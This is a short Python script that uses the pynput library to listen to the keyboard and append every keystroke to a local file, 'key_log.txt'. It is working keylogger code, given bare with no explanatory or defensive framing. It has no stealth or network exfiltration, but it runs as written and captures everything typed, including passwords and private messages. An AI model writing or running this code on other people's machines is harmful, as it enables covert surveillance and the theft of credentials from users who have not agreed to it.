from pynput.keyboard import Listener

def on_press(key):
    # Save the keystroke
    with open("key_log.txt", "a") as file:
        file.write(str(key) + "\n")

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
